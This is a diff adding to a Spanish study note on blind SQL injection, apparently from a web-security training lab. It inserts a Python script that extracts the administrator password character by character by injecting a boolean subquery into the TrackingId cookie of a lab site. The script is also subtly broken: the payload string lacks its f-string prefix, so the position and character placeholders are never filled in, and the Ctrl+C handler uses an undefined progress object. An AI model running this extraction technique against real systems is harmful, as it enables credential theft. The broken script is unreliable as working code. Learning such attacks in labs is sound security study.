@@ -131,6 +131,108 @@ Con estas identificadas haremos lo mismo con la introducción de cadenas de text
 
  [^1 En resumen nos tenemos que basar en el mensaje de `Welcome` para determinar cuando ciertos caracteres existen o no en las cadenas y tablas de las bases de datos]
 
+Podemos automatizarlo con un script semejante al siguiente
+```python
+#!/usr/bin/env python3
+
+  
+
+from pwn import *
+
+from termcolor import colored
+
+import requests
+
+import sys
+
+import signal
+
+import string
+
+import time
+
+  
+  
+
+def def_handler(sig, frame):
+
+    print(colored(f"\n\n[!] Saliendo...\n", 'red'))
+
+    p1.failure("Ataque de fuerza bruta detenido")
+
+    sys.exit(1)
+
+  
+
+# Ctrl + C
+
+signal.signal(signal.SIGINT, def_handler)
+
+  
+
+characters = string.ascii_lowercase + string.digits
+
+  
+  
+
+def makeSQLI():
+
+    p1 = log.progress("SQLI")
+
+    p1.status("Inciando ataque de fuerza bruta")
+
+  
+
+    time.sleep(2)
+
+  
+
+    password = ""
+
+  
+
+    p2 = log.progress("Password")
+
+  
+
+    for position in range(1, 21):
+
+        for character in characters:
+
+            cookies = {
+
+                'TrackingId': "Py8LO6PaRnmBjEv7' AND (SELECT substring(password,{position},1) FROM users where username='administrator')='{character}';",
+
+                'session': "6IGqJakJQNeHesyxmDfbJoI7ErU2jIK7"
+
+             }
+
+            p1.status(cookies["TrackingId"])
+
+  
+
+            r = requests.get("https://0a5a004e044b0feb8749a20e005f0068.web-security-academy.net", cookies=cookies)
+
+  
+
+            if "Welcome back" in r.text:
+
+                password += character
+
+                p2.status(password)
+
+                break
+
+  
+  
+
+if __name__ == '__main__':
+
+  
+
+    makeSQLI()
+```
+
 ### Con errores condicionales
 En este tipo de inyección nos basaremos en errores en los códigos de respuesta, siempre que la respuesta que nos muestre sea el código de estado igual a la respuesta original es que vamos por el buen camino
 
